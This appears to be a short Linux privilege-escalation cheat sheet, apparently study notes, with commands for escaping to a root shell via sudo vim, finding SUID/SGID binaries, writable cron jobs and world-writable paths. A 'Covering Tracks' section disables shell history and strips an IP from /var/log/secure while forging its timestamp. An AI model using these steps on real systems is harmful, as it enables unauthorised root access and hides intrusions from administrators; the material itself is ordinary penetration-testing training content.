# Linux Exploitation
## Privilege Escalation
## https://gtfobins.github.io/ - break out of restricted shells
```
sudo -l

## User student may run the following commands
## vim /etc/ssh/sshd_config (or whatever file)

sudo vim /etc/ssh/sshd_config

## in vim

:!/bin/bash
```
## SUID/GUID 
```
find / -type f -perm /4000 -ls 2>/dev/null   #FIND SUID ONLY FILES
find / -type f -perm /2000 -ls 2>/dev/null   #FIND SGID ONLY FILES
find / -type f -perm /6000 -ls 2>/dev/null   #FIND SUID/SGID FILES
```
# Insecure Permissions
## CRON
```
#Cron daemon runs as root
https://crontab.guru/

/var/spool/cron/crontabs  #User level jobs
/etc/crontab              #System level jobs
/etc/cron.*               #Hourly,Daily,Weekly

crontab -l                #lists for current user
contab -u <user> -l       #lists for a specified user

find /var/spool/cron/crontabs /etc/cron* -writable -ls
#Finds any cron file or directory that can be written to.

find /etc/cron* -type f -exec grep -Eo '/.*' {} \;
#Find potential path and filename by looking for any entry that starts with a slash
```
## World-Writable Files and Directories
```
find / -type f -perm /2 -o -type d -perm /2 2>/dev/null
#Search for any file or directory that is writable by the context "other"

find / -type f -writable -o -type d -writable 2>/dev/null
#Search for any file or directory that is writable by the current user
```
## Vunerable Services 
```
ps aux | grep root   # root processes can be identified

netstat -antu 
#or                  # Open sockets
ss -antu
```
# Covering Tracks 
```
unset HISTFILE

grep -v "192.168.0.55" /var/log/secure > /tmp/secure.clean; mv /tmp/secure.clean /var/log/secure; touch -t 02180455 /var/log/secure
# Removes the IP address 192.168.0.55 from /var/log/secure and places it in a new file called /tmp/secure.clean, moves the new file over the original file, and alters the timestamp in an attempt to make it look normal.
```
